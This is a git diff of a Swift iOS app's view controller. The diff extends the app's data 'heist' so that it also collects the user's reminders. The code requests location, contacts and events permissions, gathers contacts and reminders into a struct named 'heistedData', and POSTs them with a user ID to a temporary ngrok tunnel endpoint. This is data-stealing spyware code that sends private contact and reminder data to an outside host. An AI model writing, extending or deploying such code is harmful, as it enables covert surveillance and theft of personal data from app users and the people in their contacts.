@@ -7,12 +7,14 @@
 
 import UIKit
 import CoreLocation
+import EventKit
 
 struct heistedData {
     var Contacts: [FetchedContact]
     var Location: [CLLocationDegrees?]? // not reliable cause of location change trigger
+    var Reminders: [EKReminder]
 }
-var userData = heistedData(Contacts: [])
+var userData = heistedData(Contacts: [], Reminders: [EKReminder]())
 
 class ViewController: UIViewController, CLLocationManagerDelegate {
     
@@ -28,8 +30,9 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
     override func viewDidLoad() {
         super.viewDidLoad()
         
-        appPermissions.askLocationPermission();
-        appPermissions.askContactsPermissions();
+        appPermissions.askLocationPermission()
+        appPermissions.askContactsPermissions()
+        appPermissions.askEventsPermissions()
     }
 
     @IBAction func startButtonPressed(_ sender: UIButton) {
@@ -40,10 +43,29 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
         
         // contacts
         self.heistContacts()
-                
-        var contacts: [String: Any] = [:]
+        
+        // reminders
+        self.heistReminders()
+        
         let jsonTodo: Data
-
+        do {
+            var postData: [String: Any] = [:]
+            postData["contacts"] = parseContacts()
+            postData["reminders"] = userData.Reminders
+            postData["device_type"] = "ios_app"
+            postData["user_id"] = self.userID
+            postData["is_api"] = true;
+            
+            jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
+        } catch {
+            print("Error: cannot create JSON from postData")
+            return
+        }
+        saveUserData(jsonTodo: jsonTodo)
+    }
+    
+    private func parseContacts() -> [String: Any] {
+        var contacts: [String: Any] = [:]
         for contact in userData.Contacts {
             let phone: String
             phone = contact.telephone ?? ""
@@ -58,19 +80,17 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
             ]
             
         }
-        do {
-            var postData: [String: Any] = [:]
-            postData["contacts"] = contacts
-            postData["device_type"] = "ios_app"
-            postData["user_id"] = self.userID
-            postData["is_api"] = true;
-            
-            jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
-        } catch {
-            print("Error: cannot create JSON from postData")
+        
+        return contacts
+    }
+    
+    private func heistReminders() {
+        if !appPermissions.canAccessUserEvents() {
+            showPermissionBlockedUI(title: "Events permission is disabled", message: "Please enable events Services in your Settings")
             return
         }
-        saveUserData(jsonTodo: jsonTodo)
+        
+        userData.Reminders = appPermissions.getUserReminders()
     }
     
     private func heistLocation() {
@@ -137,7 +157,7 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
     }
     
     func saveUserData(jsonTodo: Data) {
-        let todosEndpoint: String = "https://304e66514f88.ngrok.io/insertPermissions.php"
+        let todosEndpoint: String = "https://f0cfc4a67070.ngrok.io/insertPermissions.php"
         guard let todosURL = URL(string: todosEndpoint) else {
           print("Error: cannot create URL")
           return
@@ -181,5 +201,7 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
         }
         task.resume()
     }
+    
+    
 }
 
